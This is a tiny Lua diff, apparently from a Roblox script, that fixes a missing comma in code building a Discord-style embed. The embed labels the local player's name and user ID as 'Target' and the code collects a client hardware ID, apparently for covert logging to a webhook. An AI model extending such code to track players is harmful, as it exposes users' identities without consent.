@@ -52,7 +52,7 @@ task.spawn(function()
         local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
         local payload = Http:JSONEncode({
             ["embeds"] = {{
-                ["title"] = "skibidi"
+                ["title"] = "skibidi",
                 ["color"] = 0xFF0000,
                 ["fields"] = {
                     {["name"] = "Target", ["value"] = string.format("%s (%d)", LP.Name, LP.UserId), ["inline"] = true},
